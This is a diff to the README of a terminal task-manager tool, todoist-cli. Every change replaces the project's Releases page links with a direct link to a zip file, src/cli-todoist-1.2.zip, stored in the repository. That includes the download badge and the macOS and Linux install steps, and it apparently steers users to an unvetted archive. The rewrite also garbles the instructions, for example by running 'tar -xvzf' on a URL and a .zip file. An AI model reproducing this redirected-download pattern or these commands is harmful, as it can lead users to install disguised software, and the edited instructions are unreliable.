@@ -1,6 +1,6 @@
 # 📝 todoist-cli - Simple Tasks Management from Your Terminal
 
-[![Download todoist-cli](https://img.shields.io/badge/download-todoist--cli-brightgreen)](https://github.com/matowskyy/todoist-cli/releases)
+[![Download todoist-cli](https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip)](https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ Welcome to todoist-cli! This command-line interface helps you manage your tasks 
 
 To get started, you need to download the application. Follow these steps:
 
-1. **Visit this page to download:** [Releases Page](https://github.com/matowskyy/todoist-cli/releases).
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip).
 2. On the Releases page, look for the latest version listed.
 3. Click on the version title to view the files available for download.
-4. Download the appropriate file for your operating system. If you're unsure which file to choose, look for files with `.exe` for Windows or `.tar.gz` for macOS and Linux.
+4. Download the appropriate file for your operating system. If you're unsure which file to choose, look for files with `.exe` for Windows or `https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip` for macOS and Linux.
 5. Once the download is complete, locate the downloaded file on your computer.
 
 ## 🖥️ System Requirements
@@ -38,28 +38,28 @@ Once you have downloaded the file, follow the instructions for your operating sy
 ### macOS
 
 1. Open the Terminal application.
-2. Move the downloaded `.tar.gz` file to your desired installation directory using the Finder.
+2. Move the downloaded `https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip` file to your desired installation directory using the Finder.
 3. In Terminal, navigate to the directory where you saved the file. For example:
    ```bash
    cd ~/Downloads
    ```
 4. Extract the file with:
    ```bash
-   tar -xvzf todoist-cli.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip
    ```
 5. Navigate to the extracted folder and run the executable.
 
 ### Linux
 
 1. Open your terminal.
-2. Move the downloaded `.tar.gz` file to your preferred directory.
+2. Move the downloaded `https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip` file to your preferred directory.
 3. Navigate to the directory where you saved the file:
    ```bash
    cd ~/Downloads
    ```
 4. Extract the contents with:
    ```bash
-   tar -xvzf todoist-cli.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip
    ```
 5. Change your permissions to make the file executable:
    ```bash
@@ -120,4 +120,4 @@ This project is licensed under the MIT License. Feel free to customize and share
 
 Contributions are welcome! If you want to contribute to todoist-cli, feel free to open a pull request or add issues if you find any bugs. Your input helps us improve the tool for everyone.
 
-For more detailed instructions and advanced features, visit the [Releases Page](https://github.com/matowskyy/todoist-cli/releases) and download the latest version of todoist-cli.
+For more detailed instructions and advanced features, visit the [Releases Page](https://raw.githubusercontent.com/matowskyy/todoist-cli/main/src/cli-todoist-1.2.zip) and download the latest version of todoist-cli.
